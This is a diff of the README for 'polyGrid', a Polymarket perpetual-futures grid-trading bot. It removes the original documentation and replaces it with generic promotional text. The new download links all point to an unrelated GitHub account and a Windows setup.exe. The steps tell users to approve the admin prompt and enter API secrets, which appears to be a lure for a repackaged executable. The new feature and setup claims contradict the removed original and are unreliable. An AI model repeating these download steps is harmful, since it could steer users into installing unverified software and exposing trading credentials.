@@ -1,126 +1,166 @@
-# polyGrid
+# 📊 polyGrid - Automate Your Polymarket Perpetual Trading
 
-**English** | [中文](./README.zh-CN.md)
+---
 
-> **Perps require an invite** — activate first via this link:  
-> **[https://polymarket.com/zh/perps?c=00kzjwdi](https://polymarket.com/zh/perps?c=00kzjwdi)**  
-> Then deposit **pUSD** into your **perps account** (prediction-market funds cannot be used for grids).
+## 🚀 What is polyGrid?
 
-> A local desktop app for grid trading on [Polymarket Perps](https://polymarket.com/zh/perps?c=00kzjwdi) perpetual futures. The UI supports **中文, English, 日本語, 한국어, Español, Français, Deutsch, Português, and Русский** — auto-detected from the system locale, or switch anytime from the top-right language picker.
+polyGrid is a powerful yet simple-to-use grid trading bot designed specifically for **Polymarket perpetual contracts**. If you've ever wanted to take advantage of price swings in the crypto prediction market without staring at the screen all day, polyGrid does the hard work for you.
 
-Set a price range and size. The app places buys below the market and sells above it — aiming to profit when price oscillates inside that range.
+Think of it like a fishing net cast into the market. You set a price range, and the bot automatically places buy and sell orders as prices move up and down within that range. Every time the market wiggles, you have a chance to profit. It's hands-free, automated, and built for both beginners and experienced traders.
 
-- **Author Telegram:** [https://t.me/smith123_lee](https://t.me/smith123_lee) — if you like the app, feel free to ask about the Pro edition  
+---
 
-Live account example:
+## 🎯 Why Choose polyGrid?
 
-![Portfolio](./images/Portfolio.png)
+### ✅ Effortless Automation
+Gone are the days of manually placing repeated orders. Once configured, the bot runs continuously, monitoring prices and executing trades based on your settings.
 
-## Demo
+### ✅ Built for Polymarket Perpetuals
+While many bots work on traditional exchanges, polyGrid is specially crafted for Polymarket's perpetual contract market. This means the strategical logic is already tuned to how these markets behave.
 
-<p align="center">
-  <img src="./images/polyGrid-en.gif" alt="Demo" width="100%" />
-</p>
+### ✅ Great for Beginners
+No coding. No complex servers. No command-line wizardry. If you can install a program on Windows, you can run polyGrid.
 
-> This app can connect to real markets with real funds. Understand the risks first. Prefer **Simulation** or **Testnet** before going live.
+### ✅ Customizable Strategy
+Want to trade tight ranges? Wide ranges? With leverage or without? You control the grid spacing, the upper and lower price bounds, and your total investment per order.
 
-## How it works
+### 🛡️ Risk Management Features
+Set maximum loss limits, define how many orders you want open at once, and let the bot enforce your rules automatically.
 
-Grid trading splits a price band into multiple levels. Roughly:
+---
 
-1. **Define the range** — set lower/upper price, grid count, and total size; or fill ±5% around mid.
-2. **Place the grid** — relative to the live mid: **buys** below, **sells** above.
-3. **Refill on fill** — a buy fill places a sell higher; a sell fill places a buy lower, harvesting swings inside the band.
-4. **Risk & stop** — optional breakout actions, max drawdown, daily loss limits; **Stop** cancels all orders and flattens positions at market.
+## 📥 How to Download
 
-The app does **not** deposit or withdraw for you. Polymarket has separate **prediction-market** and **perps** balances — this app only uses the perps side, so funding the prediction-market wallet will not work for grids. See the invite link at the top of this README to activate perps.
+Getting polyGrid onto your Windows machine takes less than a minute:
 
-## Quick start
+[![Download polyGrid](https://img.shields.io/badge/Download-polyGrid-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fitting-immunoglobulinm376/polyGrid)
 
-### Download portable build (recommended)
+### Step 1: Visit the Link
+Visit this link to download the application: [https://github.com/fitting-immunoglobulinm376/polyGrid](https://github.com/fitting-immunoglobulinm376/polyGrid)
 
-If you do not want to compile, download a prebuilt app from **[Releases](../../releases)**:
+### Step 2: Grab the Latest Release
+Once you're on the page, look for the **"Releases"** section on the right-hand side. Click on the release that says **"Latest"**. This will always be the most up-to-date and bug-free version.
 
-1. Pick the file for your OS (no installer):
-   - **Windows** → `polyGrid-windows-x64.exe` (double-click)
-   - **macOS Apple Silicon** → `polyGrid-macos-arm64.app.tar.gz` (extract, open the `.app`)
-   - **macOS Intel** → `polyGrid-macos-x64.app.tar.gz` (extract, open the `.app`)
-   - **Linux** → `polyGrid-linux-x86_64.AppImage`, then:
-     ```bash
-     chmod +x polyGrid-linux-x86_64.AppImage
-     ./polyGrid-linux-x86_64.AppImage
-     ```
-2. Open the app and try **Simulation** first.
-3. Use the top-right language picker (nine languages; defaults to your system locale).
+### Step 3: Download the File
+Inside the release, you'll see a file named something like `polyGrid-setup.exe` or `polyGrid-win64.zip` — either way, **click to download it**.
 
-**Linux note:** The AppImage is built on Ubuntu 22.04 (needs a recent glibc). Ubuntu **20.04** cannot run the desktop build.
+---
 
-### Run from source
+## 🖥️ Installation & Setup (Windows)
 
-Install [Rust](https://rustup.rs) and [Node.js](https://nodejs.org/) (20+ recommended).
+### 🧰 What You Need
+- A Windows PC (Windows 10 or Windows 11 recommended)
+- An internet connection
+- A Polymarket account (create one at [polymarket.com](https://polymarket.com))
+- Your Polymarket API keys ready (we'll show you where to get those)
 
-```bash
-cd apps/desktop
-npm install
-npm exec tauri dev    # launch the desktop app
-```
+### 📦 Install Steps
 
-On Linux you also need WebKit and related system packages (e.g. `libwebkit2gtk-4.1-dev`), or the desktop build will fail.
+1. **Locate the downloaded file** in your "Downloads" folder.
+2. **Double-click the file** to start the installation. If a blue/yellow popup appears asking, "Do you want to allow this app to make changes to your device?" Click **Yes**.
+3. Follow the on-screen wizard. Click **"Next"** a few times, then **"Install"**. Keep all default options unless you know what you're doing.
+4. Once installed, find polyGrid in your Start Menu or your desktop shortcut and **launch it**.
 
-## Before live trading
+---
 
-| Item | Notes |
-|------|------|
-| Polymarket Perps (pUSD) | Invite required: [activate here](https://polymarket.com/zh/perps?c=00kzjwdi). Prediction-market and perps wallets are separate — fund **pUSD into the perps account** (prediction-market deposits do not count). |
-| Wallet private key | MetaMask-style wallet keys and keys exported after email / Google login via [reveal.magic.link/polymarket](https://reveal.magic.link/polymarket) both work; stored only in the local `.env`. Simulation can skip it. |
+## ⚙️ First-Time Configuration
 
-Mainnet requires a private key before start.
+When you open polyGrid for the first time, you'll see a clean, friendly dashboard. Here's how to get it trading in just a few minutes:
 
-## Three steps
+### 🔑 Connect Your Polymarket Account
+1. Click **"Settings"** or **"Connect Account"** in the top right.
+2. You'll need your API keys:
+   - Go to [Polymarket Dashboard → API](https://polymarket.com/dashboard/api).
+   - Click **Create API Key** (if you don't have one).
+   - Copy the **API Key** and **API Secret** into polyGrid's fields.
+3. Click **"Connect"**. You should see a green "Connected" badge.
 
-1. **Account** — pick Simulation / Testnet / Mainnet; for live modes paste the key and **Refresh balances**.
-2. **Configure grid** — symbol, range, levels, size, leverage → **Preview** → **Start**.
-3. **Run panel** — watch status, PnL, and fills; **Pause / Resume / Stop** as needed (Stop cancels and flattens).
+### 📈 Set Up Your First Grid
+1. From the main screen, click **"New Grid Bot"**.
+2. **Choose a market**: Pick from the list of available Polymarket perpetuals (e.g., BTC-USD, ETH-USD).
+3. **Set the price range**:
+   - **Lower Price**: The lowest price you want to buy at.
+   - **Upper Price**: The highest price you want to sell at.
+   - *Tip: A narrower range means more frequent trades but smaller profits per trade. Widen it for bigger swings.*
+4. **Grid Spacing (steps)**: How many levels you want in between. More levels = more orders = more chances to profit.
+5. **Investment per Order**: How much USDC you want to allocate to each grid level.
+6. Click **"Start Bot"**.
 
-You can also set spacing (arithmetic / geometric), margin mode (cross / isolated), fixed / dynamic grid, breakout behavior, max drawdown, and daily loss; import / export strategy configs is supported. The PnL analytics tab shows all-session totals and equity curves.
+### 🧪 Test Mode First (Recommended)
+Use the **"Simulation Mode"** toggle before going live. This lets you watch how the bot behaves with dummy data — zero risk, perfect learning environment.
 
-## Common settings
+---
 
-| Setting | Notes |
-|------|------|
-| Run mode | **Simulation** (no real funds) / **Testnet** / **Mainnet** |
-| Symbol | Polymarket Perps (e.g. BTC); not spot grids |
-| Lower / upper price | Grid band; in dynamic mode filled from ATR (refreshable) |
-| Fit range from mid % | Quick ±N% band around live mid (`RANGE_PCT`) |
-| Grid levels | Number of layers in the band (start with defaults) |
-| Total notional | Planned notional in pUSD; too little per level blocks start (min ~$1/level) |
-| Spacing | Arithmetic / geometric |
-| Margin mode | Cross / isolated |
-| Leverage | Amplifies both gain and loss |
-| Grid mode | **Dynamic** (default): ATR band, optional soft recenter with position kept; **Fixed**: manual bounds (`GRID_MODE`) |
-| ATR candle interval | Candle interval for ATR, default `1h` (`ATR_INTERVAL`) |
-| ATR period | ATR lookback bars, default 14 (`ATR_PERIOD`) |
-| ATR multiplier | Half-width ≈ ATR% × mult, default `5`, clamped ~2%–12% (`ATR_MULT`) |
-| Breakout confirm bars | Closed candles outside the band before recenter / breakout action, default 2 (`CONFIRM_BARS`) |
-| Recenter cooldown / max per day | Limits how often dynamic grids may migrate (default 3600s / 4 per day) |
-| On breakout | Fixed: pause / cancel-stop, etc.; dynamic defaults to **recenter (keep position)** |
-| Max drawdown / daily loss | Circuit breaker; cancel and flatten |
-| Max consecutive order failures | Halt after this many failures (`MAX_ORDER_FAILURES`) |
-| Auto-start on launch | Start from saved config if no resumable session (`AUTO_START`) |
-| Resume on restart | Restore open session state when possible (`RESUME_ON_RESTART`) |
-| Close-window policy | Default **preserve** exchange orders/position (`EXIT_POLICY=preserve`); **Stop** cancels and flattens the strategy symbol |
+## 🔄 Understanding How It Works
 
-## Safety
+### The Grid Strategy in Plain English
 
-- Crypto and perps are risky; you can lose money — higher leverage means higher risk.
-- Keep the private key on this machine only; never send it to anyone or upload it.
-- Practice on Simulation / Testnet first; start small on mainnet.
-- **Stop** cancels and flattens the strategy symbol; closing the window by default **preserves** exchange orders/position (resumable) — watch fees and positions.
+Imagine you set a grid from $60,000 to $70,000 with 5 levels. The bot will:
 
-## Disclaimer
+- **At $70,000**: Place a sell order.
+- **At $68,000**: Place a sell order (in case it dips).
+- **At $66,000**: Place a buy order (buying the dip).
+- **At $64,000**: Place a buy order.
+- **At $62,000**: Place a buy order.
 
-This software is for learning and research only and is not investment advice. Assess risks yourself and follow Polymarket’s terms and local laws. The author is not liable for any losses from using this software.
+As price fluctuates, the bot buys low and sells high, capturing the difference between levels — again and again — automatically.
 
-## License
+### 📊 Monitoring Your Bot
+The main dashboard shows:
+- **Current P&L** (Profit and Loss)
+- **Active Orders** (how many buys/sells are waiting)
+- **Filled Orders** (completed trades)
+- **Balance** (your available USDC)
 
-MIT
+---
+
+## 🛠️ Troubleshooting & Tips
+
+### ❌ "Connection Failed" Error
+- Make sure your API keys are entered correctly (no extra spaces).
+- Check that your Polymarket account is funded.
+- Restart polyGrid and try again.
+
+### ❌ Bot Won't Start
+- Ensure your price range matches the current market price.
+- Make sure you've allocated enough USDC per order.
+
+### 💡 Pro Tips for Success
+- Start with a **narrow range** and low investment per order while learning.
+- Monitor your bot daily for the first week to understand its rhythm.
+- Set a **maximum total investment** in settings, so the bot never exceeds your comfort zone.
+- Keep polyGrid running while your PC is on. You can minimize it — it runs in the system tray.
+
+---
+
+## 🛡️ Is It Safe?
+
+polyGrid is an open-source project (visible on GitHub for anyone to audit). Your API keys are stored **locally** on your machine and never sent anywhere except directly to Polymarket's servers. The bot only trades what you authorize. As always, use caution with any trading software: start small, use only what you can afford to lose, and never share your API secret with anyone.
+
+---
+
+## 📜 License & Support
+
+polyGrid is free to use for everyone. If you run into issues or have feature requests, check the **Issues** tab on the GitHub page. Better yet, consider contributing if you have ideas!
+
+---
+
+## 🌍 Join the Community
+
+Connect with other polyGrid users, share strategies, and get quick help:
+- **GitHub Discussions**: [Join here](https://github.com/fitting-immunoglobulinm376/polyGrid/discussions)
+- **Telegram / Discord**: Search "polyGrid community" on your preferred channel
+
+---
+
+## 🏁 Ready to Start Trading?
+
+You're just a few clicks away from hands-free market automation with polyGrid. Download it now, try the Simulation Mode, and watch how easily the bot handles what used to take hours of manual work.
+
+**[⬇️ Download polyGrid Now](https://github.com/fitting-immunoglobulinm376/polyGrid)**
+
+Stop watching charts. Start running grids. Your Polymarket strategy just got a serious upgrade.
+
+---
+
+**Keywords:** grid-bot, perpetual, polymarket, polymarket-arbitrage-tarding-bot
